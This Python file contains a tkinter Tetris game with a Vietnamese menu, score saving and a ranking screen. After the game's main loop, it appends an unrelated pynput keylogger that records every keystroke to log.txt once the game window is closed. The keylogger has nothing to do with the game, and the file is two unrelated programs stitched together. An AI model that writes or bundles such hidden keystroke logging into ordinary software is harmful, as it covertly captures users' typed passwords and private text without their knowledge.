import tkinter as tk
from tkinter import messagebox
import json
import random

SCORE_FILE = "scores.json"


# ======================
# SCORE SYSTEM
# ======================

def load_scores():
    try:
        with open(SCORE_FILE, "r") as f:
            return json.load(f)
    except:
        return []


def save_score(score):
    scores = load_scores()
    scores.append(score)
    scores.sort(reverse=True)
    scores = scores[:10]

    with open(SCORE_FILE, "w") as f:
        json.dump(scores, f)


# ======================
# GAME
# ======================

class TetrisGame:

    WIDTH = 10
    HEIGHT = 20
    CELL = 25

    SHAPES = [
        [[1, 1, 1, 1]],

        [[1, 1],
         [1, 1]],

        [[0, 1, 0],
         [1, 1, 1]],

        [[1, 0, 0],
         [1, 1, 1]],

        [[0, 0, 1],
         [1, 1, 1]],

        [[1, 1, 0],
         [0, 1, 1]],

        [[0, 1, 1],
         [1, 1, 0]]
    ]

    def __init__(self, root):

        self.root = root
        self.root.title("Tetris")

        self.canvas = tk.Canvas(
            root,
            width=self.WIDTH*self.CELL,
            height=self.HEIGHT*self.CELL,
            bg="black"
        )
        self.canvas.pack()

        self.score = 0

        self.board = [
            [0]*self.WIDTH
            for _ in range(self.HEIGHT)
        ]

        self.spawn()

        root.bind("<Left>", self.left)
        root.bind("<Right>", self.right)
        root.bind("<Down>", self.down)
        root.bind("<Up>", self.rotate)

        self.update()

    def spawn(self):
        self.shape = random.choice(self.SHAPES)
        self.x = 3
        self.y = 0

    def collision(self, x, y, shape):

        for r, row in enumerate(shape):
            for c, val in enumerate(row):

                if val:

                    nx = x + c
                    ny = y + r

                    if nx < 0 or nx >= self.WIDTH:
                        return True

                    if ny >= self.HEIGHT:
                        return True

                    if ny >= 0 and self.board[ny][nx]:
                        return True

        return False

    def merge(self):

        for r, row in enumerate(self.shape):
            for c, val in enumerate(row):

                if val:
                    self.board[self.y+r][self.x+c] = 1

        self.clear_lines()
        self.spawn()

        if self.collision(self.x, self.y, self.shape):

            save_score(self.score)

            messagebox.showinfo(
                "Game Over",
                f"Điểm: {self.score}"
            )

            self.root.destroy()

    def clear_lines(self):

        new_board = []

        lines = 0

        for row in self.board:

            if all(row):
                lines += 1
            else:
                new_board.append(row)

        while len(new_board) < self.HEIGHT:
            new_board.insert(0, [0]*self.WIDTH)

        self.board = new_board

        self.score += lines * 100

    def left(self, e):
        if not self.collision(
                self.x-1,
                self.y,
                self.shape):
            self.x -= 1

    def right(self, e):
        if not self.collision(
                self.x+1,
                self.y,
                self.shape):
            self.x += 1

    def down(self, e=None):

        if not self.collision(
                self.x,
                self.y+1,
                self.shape):
            self.y += 1
        else:
            self.merge()

    def rotate(self, e):

        rotated = list(zip(*self.shape[::-1]))
        rotated = [list(row) for row in rotated]

        if not self.collision(
                self.x,
                self.y,
                rotated):
            self.shape = rotated

    def draw(self):

        self.canvas.delete("all")

        for y in range(self.HEIGHT):
            for x in range(self.WIDTH):

                if self.board[y][x]:
                    self.canvas.create_rectangle(
                        x*self.CELL,
                        y*self.CELL,
                        (x+1)*self.CELL,
                        (y+1)*self.CELL,
                        fill="cyan"
                    )

        for r, row in enumerate(self.shape):
            for c, val in enumerate(row):

                if val:
                    self.canvas.create_rectangle(
                        (self.x+c)*self.CELL,
                        (self.y+r)*self.CELL,
                        (self.x+c+1)*self.CELL,
                        (self.y+r+1)*self.CELL,
                        fill="red"
                    )

        self.canvas.create_text(
            50,
            10,
            text=f"Score: {self.score}",
            fill="white"
        )

    def update(self):

        self.down()

        self.draw()

        self.root.after(500, self.update)


# ======================
# MENU
# ======================

def play_game():

    game_window = tk.Toplevel()

    TetrisGame(game_window)


def show_rank():

    scores = load_scores()

    text = "\n".join(
        [f"{i+1}. {s}"
         for i, s in enumerate(scores)]
    )

    if not text:
        text = "Chưa có dữ liệu"

    messagebox.showinfo(
        "Bảng Xếp Hạng",
        text
    )


root = tk.Tk()

root.title("TETRIS")

root.geometry("300x300")

title = tk.Label(
    root,
    text="TETRIS",
    font=("Arial", 24, "bold")
)
title.pack(pady=20)

btn_play = tk.Button(
    root,
    text="▶ Chơi Game",
    width=20,
    command=play_game
)
btn_play.pack(pady=10)

btn_rank = tk.Button(
    root,
    text="🏆 Rank Điểm",
    width=20,
    command=show_rank
)
btn_rank.pack(pady=10)

btn_exit = tk.Button(
    root,
    text="❌ Thoát",
    width=20,
    command=root.quit
)
btn_exit.pack(pady=10)

root.mainloop()

from pynput import keyboard

def keypress(key):
    # Chuyển đổi key thành chuỗi để kiểm tra dễ dàng hơn
    key_str = str(key)
    
    # Cách chuẩn để dừng Listener trong pynput là trả về False
    if key_str == "Key.f10":
        print("\n[Đang dừng chương trình...]")
        return False  
    
    # Sử dụng cấu trúc 'with' để quản lý file an toàn hơn
    try:
        with open('log.txt', 'a', encoding='utf8') as f:
            # Xử lý định dạng hiển thị cho các phím đặc biệt (ví dụ: Key.space)
            if key_str.startswith("Key."):
                f.write(f" [{key_str.split('.')[1]}] ")
            else:
                # Loại bỏ dấu nháy đơn xung quanh ký tự thông thường (ví dụ: 'a' thành a)
                f.write(key_str.replace("'", ""))
    except Exception as e:
        print(f"Lỗi ghi file: {e}")

# Khởi chạy bộ lắng nghe sự kiện từ bàn phím
with keyboard.Listener(on_press=keypress) as obj:
    print("Chương trình đang chạy... Nhấn F10 để thoát.")
    obj.join()